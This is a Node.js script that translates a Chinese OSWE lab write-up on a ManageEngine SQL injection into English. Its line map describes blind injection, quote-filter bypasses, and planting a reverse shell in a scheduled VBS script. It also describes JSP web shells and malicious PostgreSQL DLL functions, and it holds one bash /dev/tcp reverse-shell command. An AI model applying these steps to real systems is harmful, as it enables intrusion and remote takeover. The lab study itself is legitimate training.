import fs from "fs";
import path from "path";
import { fileURLToPath } from "url";

const __dirname = path.dirname(fileURLToPath(import.meta.url));
const ROOT = path.resolve(__dirname, "..");

const zhPath =
  process.argv[2] ||
  "z:/Github/Current_Study_Project/003_OSWE/04 - 靶机练习/001_ManageEngine - AMUserResourcesSYncServlet SQL.md";
const enPath = path.join(ROOT, "content/manageengine-amuserresourcesyncservlet-sql.en.md");

const headingMap = {
  "漏洞发现": "Vulnerability Discovery",
  "漏洞利用 (方法一)": "Exploitation (Method 1)",
  "读取文件操作": "Reading Files",
  "写入文件操作": "Writing Files",
  "通过修改vbs文件获得Reverse shell": "Reverse Shell via VBS Script Tampering",
  "通过篡改 Java 类文件和使用 JSP 文件获得reverse shell": "Reverse Shell via Java Class and JSP Tampering",
  "漏洞利用 (方法二)": "Exploitation (Method 2)",
  "原理及检验": "Theory and Validation",
  "从远端加载扩展": "Loading Extensions from a Remote Share",
  "获得 Reverse Shell": "Obtaining a Reverse Shell",
  "漏洞利用 (方法三)": "Exploitation (Method 3)",
  "原理介绍": "Overview",
  "额外付出": "Extra Mile"
};

const lineMap = new Map(
  Object.entries({
    "本Blog将深入分析并利用 `ManageEngine_AMUserResourceSyncServlet_servlet` 中发现的 SQL 注入漏洞，该漏洞可用于获取对底层操作系统的访问权限。此外，本Blog还将探讨如何审核已编译的 Java servlet 以检测类似的严重漏洞。":
      "This blog analyzes and exploits the SQL injection vulnerability in `ManageEngine_AMUserResourceSyncServlet_servlet`, which can be used to gain access to the underlying operating system. It also covers how to audit compiled Java servlets for similar critical flaws.",
    "本Blog采用的是白盒审计的形式, 从发现漏洞到利用, 最后是python脚本来获取reverse shell.":
      "This write-up follows a white-box audit workflow: vulnerability discovery, exploitation, and finally Python scripts to obtain a reverse shell.",
    "使用`JD-GUI`反编译器进行恢复原始Java代码":
      "Use the `JD-GUI` decompiler to recover the original Java source code.",
    "点击file中的保存, 会保存为zip文件, 解压后, 可以用notepad++来更方便的搜索.":
      "Click Save in the File menu to export a ZIP archive. After extracting it, Notepad++ makes searching much easier.",
    "第一步是找到所有 SQL 查询字符串的实例, 然后是别人和用户控制的输入, 这些可能导致 SQL 注入.":
      "The first step is to locate every SQL query string, then identify user-controlled input that may lead to SQL injection.",
    "- 使用 Notepad++ 的 `Find in Files` 功能, 能够更好的查询想要的内容.":
      "- Use Notepad++ `Find in Files` to search efficiently across the codebase.",
    "- 查找刚刚使用 `JD-GUI` 反编译出来的源码.":
      "- Search the source recovered with `JD-GUI`.",
    "- 查找刚刚使用 `JD-GUI` 反编译出来的源码.  ":
      "- Search the source recovered with `JD-GUI`.",
    "查询语句: `^.*?query.*?select.*?`":
      "Search pattern: `^.*?query.*?select.*?`",
    "但是结果太多了,  攻击面太广了, 因此可以从前端用户界面开始, 并先审查 HTTP 请求处理程序中来减小攻击面.":
      "Too many results create an overly broad attack surface, so start from the front-end UI and review HTTP request handlers first to narrow the scope.",
    "在典型的 Java servlet 中, 我们可以通过寻找它们的常数和唯一名称来找到这些函数. 函数名称以 `DO` 开头, 后面跟着请求类型名称, 例如 `do GET` 或者 `do POST` 这两个例子.":
      "In a typical Java servlet, handler methods can be found by their constant naming pattern: they start with `do` followed by the HTTP verb, such as `doGet` or `doPost`.",
    "结果仅仅只有 87 个 hits.":
      "This reduces the result set to only 87 hits.",
    "- 在 JD-GUI 中找到相关的内容进行审查.":
      "- Review the relevant matches in JD-GUI.",
    "例如下面这个, 其中第一个参数是HTTP request, 第二个参数是 HTTP response, 符合我们的要求.":
      "For example, the method below takes an HTTP request as the first argument and an HTTP response as the second, which is exactly what we need.",
    "需要我们特别关注的是 `HTTP Servlet Request object`, 因为这才是我们可以控制的.":
      "Focus on the `HTTP Servlet Request object`, because that is what we can control.",
    "在 `AMUserResourcesSyncServlet.class`  中发现了可以用于sql 注入的漏洞.":
      "A SQL injection point was identified in `AMUserResourcesSyncServlet.class`.",
    "- 原理分析":
      "- Root cause analysis",
    "核心问题是, `userID` 直接来自 HTTP 参数,":
      "The core issue is that `userID` comes directly from an HTTP parameter,",
    "核心问题是, `userID` 直接来自 HTTP 参数, ":
      "The core issue is that `userID` comes directly from an HTTP parameter, ",
    "然后没有做类型校验, 没有转义, 没有使用 `PreparedStatement`, 直接拼进SQL. 所以我们可以控制 `USERID=` 后面的SQL内容.":
      "without type validation, escaping, or `PreparedStatement` usage. The value is concatenated directly into SQL, so we control everything after `USERID=` in the query.",
    "例如, 输入正常请求: `?ForMasRange=1000&userId=5`":
      "For example, a normal request: `?ForMasRange=1000&userId=5`",
    "最终SQL:":
      "Resulting SQL:",
    "如果 `userID` 被传入 `5 or 1=1`":
      "If `userID` is supplied as `5 or 1=1`",
    "- 启用数据库日志记录进行分析":
      "- Enable database logging for analysis",
    "需要对数据库查询执行过程的可视化, 也就是查看哪些查询运行成功了, 哪些运行失败了.":
      "We need visibility into executed queries: which statements succeed and which fail.",
    "目标使用的是Postgres数据库, 需要修改其configuration file 才能开启日志记录功能.":
      "The target uses PostgreSQL. Logging must be enabled in the database configuration file.",
    "修改`log_statement`参数为`all`":
      "Set `log_statement` to `all`",
    "然后在`services.msc`中选中Manage Engine应用管理器服务进行重启,":
      "Then restart the ManageEngine Applications Manager service from `services.msc`.",
    "然后在`services.msc`中选中Manage Engine应用管理器服务进行重启, ":
      "Then restart the ManageEngine Applications Manager service from `services.msc`.",
    "打开pgAdmin, 点击 `Query Tool`.":
      "Open pgAdmin and launch `Query Tool`.",
    "使用一条简单的查询语句来测试一下.":
      "Run a simple query to verify logging.",
    "可以成功运行.":
      "The query executes successfully.",
    "可以成功运行. ":
      "The query executes successfully.",
    "查找当前目录下最新生成的文件, 方便定位启用数据库日志记录的文件.":
      "Find the newest file in the directory to locate the active PostgreSQL log.",
    "这条命令是实时更新日志中的指定内容":
      "This command tails the log and filters for the selected pattern in real time.",
    "重复之前的操作":
      "Repeat the earlier test query.",
    "在成功运行之后.":
      "After it succeeds,",
    "在成功运行之后. ":
      "After it succeeds,",
    "观察到最新的记录被更新上去了.":
      "the newest log entry shows the executed statement.",
    "- 测试漏洞":
      "- Validate the vulnerability",
    "通过 `web.xml` 找到对应的url":
      "Locate the servlet URL mapping in `web.xml`.",
    "在burpsuite中, 使用pg_sleep函数进行睡眠盲注.":
      "In Burp Suite, use `pg_sleep()` for time-based blind injection.",
    "从右下角可以看到, 花费了 11 秒才传输回来, 证明注入成功了.":
      "Burp shows an 11-second response delay, confirming successful injection.",
    "同时也可以使用命令实时查看数据库的处理情况.":
      "You can also monitor database activity from the log in real time.",
    "- 绕过HTML 编码限制":
      "- Bypassing HTML encoding restrictions",
    "但是这样通过 URL 进行传输的SQL注入, 在被送入数据库之前, 某些字符会被进行 HTML 编码.":
      "When SQL injection is sent through the URL, some characters are HTML-encoded before they reach the database.",
    "查询时不能使用引号字符串值":
      "Quoted string literals may not be usable in queries.",
    "在Mysql中, 这个问题可以用字符串的十六进制表示来解决, 但是Postgres中不可以.":
      "MySQL often allows hex-encoded strings as a workaround; PostgreSQL does not in the same way.",
    "- 使用`CHR()` 和 `||` 进行绕过":
      "- Bypass with `CHR()` and `||`",
    "当 SQL 注入点不能使用单引号字符串时，在 PostgreSQL 中可以用 `CHR(n) `构造字符串，并用 `||` 进行拼接。URL 传参时需要对特殊字符做 URL 编码，例如 `;` 编码为 `%3b`，`|` 编码为 `%7c`，空格编码为 `%20` 或 `+`。":
      "When single-quoted strings are unavailable, PostgreSQL can build strings with `CHR(n)` and concatenate them with `||`. URL-encode special characters in requests: `;` as `%3b`, `|` as `%7c`, and spaces as `%20` or `+`.",
    "> 这类绕过说明单纯过滤引号没有意义，根本修复还是 `PreparedStatement` 参数化查询。":
      "> Quote filtering alone is insufficient; the real fix is parameterized queries with `PreparedStatement`.",
    "- 使用`$$...$$`进行绕过":
      "- Bypass with `$$...$$` dollar-quoted strings",
    "PostgreSQL 支持 Dollar-Quoted String，即使用 `$$...$$` 或` $TAG$...$TAG$` 表示字符串常量。它与普通单引号字符串等价，但不需要使用 `'`，因此可以绕过只过滤单引号的弱防护。该语法常用于函数体、复杂 SQL 字符串、路径字符串或 payload 构造。但它只能绕过词法层面的引号限制，不能绕过数据库权限、文件系统权限或 stacked query 限制。":
      "PostgreSQL supports dollar-quoted strings via `$$...$$` or `$TAG$...$TAG$`. They are equivalent to single-quoted literals but avoid `'`, which helps bypass weak quote filters. This is useful for function bodies, complex SQL, paths, and payloads, but it does not bypass privilege boundaries or stacked-query restrictions.",
    "目前我们能做的也只是从数据库中通过盲注的形式实现查询, 枚举, 读数据, 但如果当前连接用户是 DBA / superuser，就可以使用更危险的能力，例如服务端文件读写、加载扩展、创建 C 语言函数、调用更高权限功能。也就是说，是否是 DBA 决定了这条链能不能从“SQL 注入”升级到“文件系统交互”甚至 RCE。":
      "Blind SQL injection can support querying, enumeration, and data extraction. If the database user is a DBA/superuser, more dangerous primitives become available: server-side file I/O, extensions, C-language functions, and privileged operations. DBA status determines whether the chain can escalate from SQL injection to filesystem interaction or RCE.",
    "以下 SQL 查询验证我们确实是该数据库的 DBA 用户：":
      "The following SQL query verifies whether the current database user is a superuser:",
    "PostgreSQL 的条件表达式。":
      "PostgreSQL conditional expressions:",
    "对应的sql注入语句如下:":
      "Example SQL injection request:",
    "对应的sql注入语句如下: ":
      "Example SQL injection request:",
    "从结果来看, 当前具有DBA权限.":
      "The delayed response indicates the current user has DBA privileges.",
    "可以用python脚本来进行验证.":
      "This can be verified with a Python script.",
    "- 在PostgreSQL中, 可以使用`Copy...to`来实现对文件系统进行读写操作.":
      "- PostgreSQL `COPY ... TO/FROM` can read and write files on the server filesystem.",
    "- 在PostgreSQL中, 可以使用`Copy...to`来实现对文件系统进行读写操作. ":
      "- PostgreSQL `COPY ... TO/FROM` can read and write files on the server filesystem.",
    "基于前面的堆叠查询, 结合`copy to`可以进行读取文件.":
      "Using stacked queries plus `COPY TO`, files can be read from disk.",
    "1. 创建一个表格":
      "1. Create a temporary table",
    "2. 并将文件中的数据复制到该表中":
      "2. Copy file contents into the table",
    "将text.txt文件中的内容复制到awae这个表中.":
      "This copies `test.txt` into table `awae`.",
    "3. 正常情况下, 这一步可以看到文件内容 (如果可以登陆目标主机)":
      "3. Under normal conditions, file contents are visible with `SELECT` if you can access the host directly",
    "4. Blind SQL Injection":
      "4. Blind SQL injection",
    "例如:":
      "Example:",
    "例如: ":
      "Example:",
    "先把想写入的数据放进表里，再通过：":
      "Place the desired content in a table, then export it with:",
    "导出到服务器文件系统。":
      "to write the data to the target filesystem.",
    "1. 创建临时的表":
      "1. Create a temporary table",
    "2. 把想要写入的内容插进去":
      "2. Insert the payload into the table",
    "3. 导出到服务器文件系统。":
      "3. Export the table to the filesystem",
    "如果需要注入的内容太长, 也可以使用`POST`请求来实现.":
      "If the payload is too large for GET, use a POST request instead.",
    "Python 脚本中实现一个 SQL 注入查询，该查询会将一个文本文件写入目标系统。":
      "The Python script below sends a stacked SQL injection payload that writes a text file on the target.",
    "> 但是不可以使用 `Copy to` 命令将二进制数据写入文件中.":
      "> `COPY TO` cannot reliably write binary data.",
    "> 使用COPY TO命令尝试将二进制数据写入文件时，可能会遇到问题，原因主要包括：":
      "> Attempting to write binary data with `COPY TO` often fails because:",
    "\t1. COPY TO命令通常用于文本数据的导出，处理二进制数据时可能会出现编码或格式转换问题，导致读取的文件内容不正确或损坏。":
      "\t1. `COPY TO` is designed for text export and may transform binary bytes, corrupting the output.",
    "\t2. 数据库的COPY TO命令在读取文件时，可能会对数据进行转义或格式化处理，这对二进制数据来说是不合适的，因为二进制数据需要保持原始不变字节。":
      "\t2. Escaping and formatting applied during export are inappropriate for raw binary content.",
    "\t3. 某些数据库或环境对COPY TO命令的文件写入权限有限制，可能无法正确写入文件系统中的目标文件。":
      "\t3. Filesystem permissions or environment restrictions may block successful writes.",
    "我们使用的方法是将恶意代码植入 ManageEngine 应用程序正在运行期间使用的 VBS 文件中. 简单来说, 当 ManageEngine 应用程序管理器配置为监控远程服务器和应用程序时, 会定期执行一些 VBS 脚本. 这些脚本位于 `C :\\Program Files (x86)\\ManageEngine\\AppManager12\\working\\conf\\application\\scripts` 目录中，并且功能各不相同。":
      "This method implants malicious code into VBS files executed periodically by ManageEngine Application Manager. When monitoring remote hosts, the product runs scripts from `C:\\Program Files (x86)\\ManageEngine\\AppManager12\\working\\conf\\application\\scripts`.",
    "1. 登陆主页面创建一个针对 ManageEngine 主机本身的监控实例.":
      "1. Log in and create a monitoring instance targeting the ManageEngine host itself.",
    "在目标主机上, 通过`process monitor` 可以来查看定期运行的  VBS文件.":
      "On the target host, Process Monitor shows which VBS files run on a schedule.",
    "我们可以看到定期执行的文件之一是wmiget.vbs。执行频率取决于给定应用程序管理器监控实例中应用程序的轮询时间设置。":
      "One recurring script is `wmiget.vbs`. Execution frequency depends on the polling interval configured for the monitored application.",
    "由于我们知道该脚本由应用程序执行，我们可以生成一个反向 shell payload并将其插入到文件末尾。目标 VBS 脚本执行的具体任务对我们来说并不重要。但是，我们希望确保脚本的原始功能得以保留，因为我们希望尽可能保持隐蔽。":
      "Because the application executes this script, we can append a reverse-shell payload while preserving original functionality for stealth.",
    "找到“被定时执行”的脚本文件":
      "Identify the scheduled script file",
    "点击 `Apply` 之后, 可以看到 ManageEngine 应用程序目录下的vbs文件.":
      "After clicking `Apply`, the VBS file under the ManageEngine application directory is updated.",
    "根据目录找到文件":
      "Locate the file in that directory",
    "复制文件内容到本地主机中.":
      "Copy the file contents to your local machine.",
    "复制文件内容到本地主机中. ":
      "Copy the file contents to your local machine.",
    "1. 我们需要将目标文件的内容转换为一行代码，并确保它能够正常执行，然后再追加我们的有效载荷。这是因为`COPY TO`无法在单个`SELECT`语句中处理换行符。":
      "1. Convert the script to a single line so it still executes, then append the payload. `COPY TO` cannot preserve newlines inside one `SELECT` string.",
    "1).首先, 查找注释并进行替换为空: `'.*`":
      "1) Remove comments with regex: `'.*`",
    "2).continuation lines: `[space]_.*?\\n` => ticked \". matches new lines\": ` _.*?\\n`":
      "2) Collapse continuation lines: `[space]_.*?\\n` with `. matches new lines`: ` _.*?\\n`",
    "特别重要的一点是，要注意 `_.*?\\n` 前面的那个空格。这个空格很容易被忽略，但在我们使用这个正则表达式时，它是非常关键、必须包含的。":
      "The leading space before `_.*?\\n` is easy to miss but required for the regex to work correctly.",
    "3).替换掉所有的制表符`\\t`":
      "3) Replace all tab characters (`\\t`)",
    "4).new lines: `\\n` => Replaced with `:`":
      "4) Replace newlines (`\\n`) with `:`",
    "这样整个 `wmiget.vbs` 文件就处理好了.":
      "At this point, the entire `wmiget.vbs` payload is flattened.",
    "2. 出于与上述相同的原因，我们的有效载荷也必须位于同一行上。":
      "2. For the same reason, the reverse-shell payload must also be one line.",
    "这是一段 Windows 的 VBScript payload，用来在目标机器上下载 `nc.exe`（Netcat）并建立一个反弹 shell。":
      "This VBScript payload downloads `nc.exe` and establishes a reverse shell.",
    "攻击机: `192.168.45.234`":
      "Attacker: `192.168.45.234`",
    "将payload复制到内容`:WScript.Quit(0):`之前即可.":
      "Insert the payload before `:WScript.Quit(0):` in the script.",
    "此时, 如果用新的`wmiget.vbs`替换掉旧的, 并在kali中设置好http server 用来传送nc.exe和监听, 即可收到reverse shell.  接下来就是通过sql注入来替换目标主机中的`wmiget.vbs`文件中的内容.":
      "Replace `wmiget.vbs` on the target via SQL injection while hosting `nc.exe` on Kali and listening for the callback.",
    "3. 我们需要在 GET 请求中对有效载荷进行两次编码。首先，我们需要使用base64编码来避免COPY TO函数中受限字符导致的问题；其次，我们需要对有效载荷进行 URL编码，以防止 Web 服务器对其进行篡改。最后，我们需要使用convert_from函数将 decode 函数的输出转换为人类可读的格式。我们将用于注入的通用查询如下所示：":
      "3. Encode the payload twice for GET delivery: Base64 first to avoid `COPY TO` character issues, then URL encoding to survive the web tier. `convert_from(decode(..., 'base64'), 'utf-8')` restores the script text. Generic injection template:",
    "先用`base64`进行编码, 再用`url`编码, 将最后的结果替换掉上面请求中的`ENCODE_PAYLOAD`即可.":
      "Base64-encode the script, URL-encode the result, and replace `ENCODED_PAYLOAD` in the request.",
    "5. 由于有效负载过大，超过了GET请求的处理能力，我们需要使用POST请求。但这不成问题，因为正如我们之前看到的，doPost函数最终会调用doGet函数。":
      "5. Large payloads require POST, which is fine because `doPost` delegates to `doGet` in this servlet.",
    "等待一段时间后, 就会收到reverse shell":
      "After the scheduled execution interval, the reverse shell connects back.",
    "对应的python脚本如下:":
      "Corresponding Python script:",
    "对应的python脚本如下: ":
      "Corresponding Python script:",
    "这种攻击向量涉及写入 JSP web shell 文件，从而实现远程代码执行。课程中有示例展示了如何写入一个 JSP 命令 shell 文件，并通过浏览器访问它来执行命令。":
      "This vector writes a JSP web shell for remote code execution. Course examples demonstrate command execution through browser access.",
    "1. 首先我们需要准备一个 JSP Web Shell 文件":
      "1. Prepare a JSP web shell",
    "它允许通过 HTTP 请求参数执行系统命令：":
      "It executes OS commands from an HTTP `cmd` parameter:",
    "将下方的命令通过http请求赋值给cmd, 目标主机在运行之后, 就会在攻击机中下载nc.exe, 然后主动发起连接, 从而获得reverse shell.":
      "Pass the command below as `cmd` in the HTTP request to download `nc.exe` and connect back.",
    "2. 利用 Java 类 文件操作写入 JSP 文件":
      "2. Write the JSP file using Java class manipulation",
    "参考：6. openCRX 身份验证绕过和远程代码执行":
      "Reference: 6. openCRX authentication bypass and remote code execution",
    "参考：[[6. openCRX 身份验证绕过和远程代码执行]]":
      "Reference: 6. openCRX authentication bypass and remote code execution",
    "3. 访问 JSP Web Shell":
      "3. Access the JSP web shell",
    "写入成功后，通过浏览器访问该 JSP 文件，传入命令参数（如 `http://target.com/shell.jsp?cmd=whoami`），验证命令执行。":
      "After a successful write, browse to the JSP with a command parameter, e.g. `http://target.com/shell.jsp?cmd=whoami`.",
    "4. 建立 Reverse Shell":
      "4. Establish a reverse shell",
    "利用 JSP Shell 执行反向连接命令，连接到你的攻击机。常用的反向 shell 命令示例（Linux）：":
      "Use the JSP shell to run a reverse-shell command toward your listener. Common Linux example:",
    "目标主机是windows, 所以当前执行的命令是:":
      "The target is Windows, so the command used here is:",
    "目标主机是windows, 所以当前执行的命令是: ":
      "The target is Windows, so the command used here is:",
    "/bin/bash -i >& /dev/tcp/你的IP/端口 0>&1":
      "/bin/bash -i >& /dev/tcp/YOUR_IP/PORT 0>&1",
    "在 PostgreSQL 中, 可以通过 \"Extension / 自定义函数\" 机制, 把外部动态库 (DLL) 中的函数加载到数据库里执行, 从而实现系统及代码执行.":
      "PostgreSQL can load functions from external DLLs through extensions/user-defined C functions, enabling OS-level execution.",
    "之前使用的方法是通过修改 Web 应用程序自身的脚本文件来执行命令, 但这种条件不一定总存在. 于是, 可以利用 PostgreSQL 的扩展机制. 因为 PostgreSQL 支持用 C 语言编写数据库函数, 只要数据库加载一个动态库, 就能直接调用里面的函数.":
      "Tampering with application scripts is not always possible, so the PostgreSQL extension mechanism is an alternative when C UDFs can be loaded.",
    "恶意代码如下, 编译后名为 `awae.dll`":
      "Malicious DLL source (compiled as `awae.dll`):",
    "连接数据库, 并列出名为`test` 的函数, 确保创建的函数是新的.":
      "Connect to the database and confirm no existing `test` function is present.",
    "创建 `test` 函数, 并将该函数绑定到我们刚刚自定义 DLL 导出的 `awae` 函数.":
      "Create function `test` bound to exported symbol `awae` in the custom DLL.",
    "创建成功后, 测试运行下面命令, 如果成功, 可以看到有三个 `calc.exe` 正在运行":
      "If successful, `SELECT test($$calc.exe$$, 3)` launches three `calc.exe` processes.",
    "如果在编写代码中有一些错误, 导致最终结果不理想, 则可能需要卸载扩展程序并从头开始.":
      "If development errors occur, unload the extension and restart cleanly.",
    "如果在编写代码中有一些错误, 导致最终结果不理想, 则可能需要卸载扩展程序并从头开始. ":
      "If development errors occur, unload the extension and restart cleanly.",
    "1. 停止 ManageEngine 服务:":
      "1. Stop the ManageEngine service:",
    "2. 服务停止后, 删除已加载到数据库内存空间中的 DLL 文件:":
      "2. Delete the DLL from disk after the service stops.",
    "3. 然后启动服务, 以便继续删除 test 功能":
      "3. Start the service again to drop the `test` function.",
    "4. 最后，重新连接psql之后, 执行 SQL 语句删除_测试_函数：":
      "4. Reconnect with `psql` and drop the test function:",
    "现在可以编辑扩展程序代码, 重新编译并重新测试扩展程序。":
      "You can then edit, recompile, and retest the extension.",
    "在 kali 攻击机上创建一个 Samba 共享, 基于 Python 的 impacket 脚本实现.":
      "On Kali, host a Samba share using Python impacket tooling.",
    "1. 创建一个名为 `awae` 的目录, 用于存放 Samba 共享资源 (其中有`awae.dll`).":
      "1. Create an `awae` directory containing `awae.dll` for the share.",
    "2. 目标主机远程连接kali":
      "2. Verify the target can access the remote share from Kali.",
    "目标可以正常访问到攻击机的共享资源文件夹":
      "The target can browse the attacker-hosted share successfully.",
    "3. 创建 `test` 函数, 并将该函数绑定到远端攻击机上的 `awae.dll`.":
      "3. Create `remote_test` bound to `awae.dll` on the attacker share.",
    "用下面命令, 关掉之前开启的三个 `calc.exe`":
      "Terminate the previous `calc.exe` instances:",
    "在数据库中运行":
      "Execute in the database:",
    "命令成功执行.":
      "The command executes successfully.",
    "恶意代码如下:  `rev_shell.c`":
      "Reverse-shell DLL source (`rev_shell.c`):",
    "设置好, 共享资源":
      "Prepare the share and payload",
    "开启本地监听":
      "Start a local listener",
    "使用以下 Python 脚本将payload发送到存在漏洞的服务器：":
      "Send the payload with the Python script below:",
    "上面是通过网络共享 DLL 文件放置在网络共享位置来实现。然而，这种方法仅适用于内部网络。理论上，在公共网络上也可以这样做，但出口过滤很可能会阻止此类流量跨越私有网络边界。":
      "Method 2 relies on a network-hosted DLL. This works well on internal networks, but egress filtering often blocks cross-boundary SMB traffic on public networks.",
    "除了远程加载 Samba 扩展之外，另一种方法是找到一种通过 SQL 查询直接将恶意 DLL 传输到远程服务器的方法。考虑到我们已经知道如何使用 `COPY TO` 函数将任意文件写入远程文件系统，我们可能会想在有效载荷中直接这样做。遗憾的是，这种方法对二进制文件并不适用。":
      "Instead of remote SMB loading, we need a way to transfer the malicious DLL purely through SQL. `COPY TO` writes arbitrary files but corrupts binary content.",
    "原因是: `COPY TO` 适合写\"文本内容\", 不适合写 DLL 这种二进制文件. DLL里面有大量非文本字节, 比如: `00 乱码 控制字符 换行符 特殊字符`. 而 `COPY TO` 会按 PostgreSQL 的文本/CSV 输出规则处理数据，可能会：`转义、截断、改换行、改变字节内容`. 结果导致: DLL 文本损坏, PostgreSQL 无法加载 或者加载后崩溃.":
      "`COPY TO` is text-oriented. DLLs contain non-text bytes (`0x00`, control characters, etc.) that get escaped, truncated, or rewritten, producing a corrupted library that PostgreSQL cannot load.",
    "那么，找到一种方法来复现之前的攻击，但这次不需要网络共享.":
      "The goal is to replicate the attack without any network share.",
    "核心就是利用 PostgreSQL Large Object 机制写二进制 DLL. 因为 `COPY TO` 会破坏 DLL 二进制内容. 而 Large Object 可以原样保存二进制数据, 所以适合写 DLL.":
      "Use PostgreSQL large objects to store binary DLL data intact, then export with `lo_export`.",
    "实现目标所需的总体步骤, 所有这些步骤应用都是利用最初发现的 SQL 注入漏洞来完成的.":
      "All steps below are driven through the original SQL injection primitive:",
    "1. 创建一个大型对象, 用于存放我们的二进制有效 payload (也就是之前自定义的 DLL)":
      "1. Create a large object for the DLL payload",
    "2. 将该大型对象导出到远程服务器文件系统.":
      "2. Export the large object to disk on the target",
    "3. 创建一个用户自定义函数 (UDF)":
      "3. Create a UDF pointing at the exported DLL",
    "4. 触发用户自定义函数 (UDF) 并执行任意代码":
      "4. Trigger the UDF to execute arbitrary code",
    "使用这条sql语句, 所产生的loid是随机, 但是可以通过第二条sql语句来产生确定的loid":
      "The first statement creates a random LOID; the second form assigns a fixed LOID.",
    "这些 Large Object 都存储在 `pg_largeobject` 表中.":
      "Large objects are stored in `pg_largeobject`.",
    "查看导入后大型对象条目中包含哪些数据。":
      "Inspect imported large-object pages:",
    "可以使用下面这条语句, 将 `loid` 值为 `1337` 的内容改为 `woot`":
      "Update LOID `1337` page data with hex-encoded content:",
    "再次检查后发现, 内容被成功修改, 通过注入十六进制的形式.":
      "Re-query to confirm the page content changed to `woot`.",
    "使用下面这条语句, 导出 `loid` 值为 `1337` 的内容到 `c:\\\\new.win.ini`":
      "Export LOID `1337` to `c:\\new.win.ini`:",
    "删除某个 large object. (处理大型对象的操作只能在 DBA 级别时进行, 非管理员没有权限)":
      "Delete large objects (requires DBA privileges):",
    "1. 使用 `xxd` 工具把 `rev_shell.dll` 文件转换为十六进制格式":
      "1. Convert `rev_shell.dll` to hex with `xxd`",
    "2. 将 DLL 的十六进制表示形式复制到python脚本中.":
      "2. Paste the hex blob into the Python script.",
    "2. 将 DLL 的十六进制表示形式复制到python脚本中. ":
      "2. Paste the hex blob into the Python script.",
    "3. 运行脚本获得 Reverse shell.":
      "3. Run the script to obtain a reverse shell.",
    "**利用本模块中发现的 SQL 注入漏洞，创建一个大型对象，并在不使用盲注的情况下检索指定的 `LOID`。相应地调整你的最终概念验证，以便运用此技术，避免使用预设的 `LOID` 值 (1337)。**":
      "**Use the SQL injection primitive to create a large object and retrieve the generated `LOID` without blind injection. Update the final PoC to use this technique instead of a hard-coded LOID (1337).**",
    "把自动生成的 LOID 存进数据库表里，然后后续 SQL 全部用子查询引用它。":
      "Store the generated LOID in a tracking table and reference it via subqueries in later SQL statements."
  })
);

function translateHeading(line) {
  const match = line.match(/^(#{1,6})\s+(.*)$/);
  if (!match) return line;
  const hashes = match[1];
  const title = match[2].trim();
  const translated = headingMap[title] || title;
  return `${hashes} ${translated}`;
}

function translateLine(line) {
  const trimmed = line.trimEnd();
  if (!trimmed) return line;
  if (/^#{1,6}\s/.test(trimmed)) return translateHeading(trimmed);
  if (/^```/.test(trimmed)) return line;
  if (/^!\[\[/.test(trimmed)) return line;
  if (lineMap.has(trimmed)) return line.replace(trimmed, lineMap.get(trimmed));
  for (const [zh, en] of lineMap.entries()) {
    if (trimmed.includes(zh)) {
      return line.replace(zh, en);
    }
  }
  if (/[\u4e00-\u9fff]/.test(trimmed)) {
    console.warn("[warn] untranslated:", trimmed.slice(0, 100));
  }
  return line;
}

function stripDuplicateTail(markdown) {
  const marker =
    "\nimport sys\nimport math\nimport requests\nimport urllib3\n\nurllib3.disable_warnings";
  const first = markdown.indexOf(marker);
  if (first === -1) return markdown;
  const second = markdown.indexOf(marker, first + marker.length);
  if (second === -1) return markdown;
  return `${markdown.slice(0, second).trimEnd()}\n`;
}

const zh = stripDuplicateTail(fs.readFileSync(zhPath, "utf8"));
const en = zh.split("\n").map(translateLine).join("\n");
fs.mkdirSync(path.dirname(enPath), { recursive: true });
fs.writeFileSync(enPath, en, "utf8");
console.log(`Wrote ${enPath}`);
